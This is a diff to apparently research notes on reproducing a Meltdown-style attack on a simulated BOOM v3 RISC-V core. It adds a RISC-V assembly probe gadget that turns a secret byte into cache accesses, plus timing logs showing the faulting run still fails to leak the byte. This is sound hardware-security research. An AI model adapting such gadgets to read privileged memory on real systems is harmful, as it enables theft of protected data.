@@ -1238,3 +1238,71 @@ MELTDOWN_US_DEBUG_ONLY=1
 This setup is sufficient to observe weak legal positive controls, but BOOM v3
 still has not recovered secret byte `0x53` through the faulting Meltdown-US
 path.
+
+## Gadget Variant 2
+
+`MELTDOWN_US_GADGET_VARIANT=2` was added to change the dependent probe access
+without touching neighboring buckets. After the secret byte selects
+`probe + secret * stride`, the gadget issues four byte loads within the same
+64-byte cache line:
+
+```asm
+lbu  t0, 0(secret_va)
+andi t0, t0, 0xff
+slli t0, t0, PROBE_SHIFT
+add  t0, t0, probe
+lb   t1, 0(t0)
+lb   t2, 8(t0)
+lb   t3, 16(t0)
+lb   t4, 24(t0)
+```
+
+The intent was to amplify the footprint of the selected cache line while
+keeping the selected bucket unchanged.
+
+Spike smoke passed for both the legal no-fault control and the no-sfence
+faulting configuration.
+
+BOOM v3, legal no-fault control:
+
+```text
+log: targets/boom/logs/MediumBoomV3Config-minios-meltdown-us-nofault-c1-var2-touch16-debugonly-r8-a1.log
+CPUS=1
+MELTDOWN_US_NPROC=4
+MELTDOWN_US_GADGET_VARIANT=2
+MELTDOWN_US_NO_FAULT=1
+MELTDOWN_US_TRAIN_USER_ACCESS=1
+MELTDOWN_US_GADGET_TOUCH_REPEATS=16
+MELTDOWN_US_TIME_REPS=8
+meltdown-us: timing hit=208 miss=274 threshold=241
+meltdown-us: training value=0x53
+meltdown-us: raw attempt=0 i53=239 i0=248 i80=285 i1=264 i55=248 i51=248 i56=248 i50=248 i54=248 i52=248
+meltdown-us: done
+real 400.65
+```
+
+This preserves the weak legal positive control: `i53=239 < threshold=241`.
+
+BOOM v3, matching no-sfence faulting run:
+
+```text
+log: targets/boom/logs/MediumBoomV3Config-minios-meltdown-us-nosfence-c1-var2-touch16-debugonly-r8-a1.log
+CPUS=1
+MELTDOWN_US_NPROC=4
+MELTDOWN_US_GADGET_VARIANT=2
+MELTDOWN_US_CLEAR_NO_SFENCE=1
+MELTDOWN_US_TRAIN_USER_ACCESS=1
+MELTDOWN_US_GADGET_TOUCH_REPEATS=16
+MELTDOWN_US_TIME_REPS=8
+meltdown-us: timing hit=208 miss=245 threshold=226
+meltdown-us: training value=0x53
+meltdown-us: raw attempt=0 i53=271 i0=324 i80=248 i1=260 i55=263 i51=308 i56=284 i50=255 i54=310 i52=274
+meltdown-us: fault recovery ok
+meltdown-us: done
+real 363.87
+```
+
+The faulting run remains negative: `i53=271` is above the `226` threshold.
+Variant 2 therefore changes the gadget shape and keeps the legal positive
+control working, but it does not make BOOM v3 forward the supervisor-only load
+value far enough to recover byte `0x53`.
